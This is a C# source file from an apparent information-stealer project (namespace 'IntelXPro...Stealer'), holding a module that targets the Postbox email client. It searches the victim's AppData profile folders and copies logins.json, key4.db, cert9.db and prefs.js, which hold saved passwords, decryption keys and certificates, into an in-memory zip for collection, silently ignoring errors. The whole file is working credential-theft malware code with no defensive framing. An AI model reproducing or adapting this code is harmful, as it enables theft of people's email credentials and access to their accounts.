using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Postbox : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Postbox");
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Postbox");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Postbox";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(localAppDataPath))
            {
                foundData |= CollectFromDirectory(localAppDataPath, "LocalAppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string profilesPath = Path.Combine(basePath, "Profiles");
                if (Directory.Exists(profilesPath))
                {
                    string[] profileDirs = Directory.GetDirectories(profilesPath, "*.default*", SearchOption.TopDirectoryOnly);

                    foreach (string profileDir in profileDirs)
                    {
                        string profileName = Path.GetFileName(profileDir);

                        string[] configFiles = new string[]
                        {
                            "prefs.js",
                            "key4.db",
                            "logins.json",
                            "cert9.db"
                        };

                        foreach (string configFile in configFiles)
                        {
                            string fullPath = Path.Combine(profileDir, configFile);
                            if (File.Exists(fullPath))
                            {
                                string zipPath = $"Applications\\Postbox\\{location}\\{profileName}\\{configFile}";
                                zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                                counterApplications.Files.Add(fullPath + " => " + zipPath);
                                foundData = true;
                            }
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
